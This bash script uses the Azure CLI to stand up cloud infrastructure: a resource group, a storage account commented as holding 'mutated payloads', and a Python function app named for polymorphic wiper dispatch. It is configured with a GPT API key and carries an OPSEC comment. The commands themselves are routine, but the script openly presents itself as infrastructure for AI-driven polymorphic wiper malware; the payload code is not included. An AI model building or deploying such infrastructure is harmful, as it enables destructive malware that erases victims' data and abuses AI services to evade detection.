#!/bin/bash

# VARIABLES
RG="WiperOpsRG"
LOCATION="eastus"
STORAGE_NAME="wipermalstore$RANDOM"
FUNC_APP="WiperPolymorphFunc"
PLAN="WiperPlan"
FUNC_NAME="polymorph_dispatch"
PYTHON_VERSION="3.11"

# STEP 1: Resource Group
az group create --name $RG --location $LOCATION

# STEP 2: Storage Account (for mutated payloads)
az storage account create --name $STORAGE_NAME \
  --resource-group $RG \
  --location $LOCATION \
  --sku Standard_LRS

# STEP 3: Function App Plan (Consumption)
az functionapp plan create --name $PLAN \
  --resource-group $RG \
  --location $LOCATION \
  --number-of-workers 1 \
  --sku Y1 \
  --is-linux

# STEP 4: Function App
az functionapp create \
  --resource-group $RG \
  --os-type Linux \
  --plan $PLAN \
  --runtime python \
  --runtime-version $PYTHON_VERSION \
  --functions-version 4 \
  --name $FUNC_APP \
  --storage-account $STORAGE_NAME

# STEP 5: Deploy Function Code (assumes zipped code)
az functionapp deployment source config-zip \
  --resource-group $RG \
  --name $FUNC_APP \
  --src ./function_app.zip

# STEP 6: App Settings for Secrets + GPT API
az functionapp config appsettings set \
  --name $FUNC_APP \
  --resource-group $RG \
  --settings \
    "OPENAI_API_KEY=<your-openai-api-key>" \
    "STORAGE_CONN_STRING=$(az storage account show-connection-string -n $STORAGE_NAME -g $RG --query connectionString -o tsv)"

# Optional: Enable VNet Integration / Private Endpoints if OPSEC required
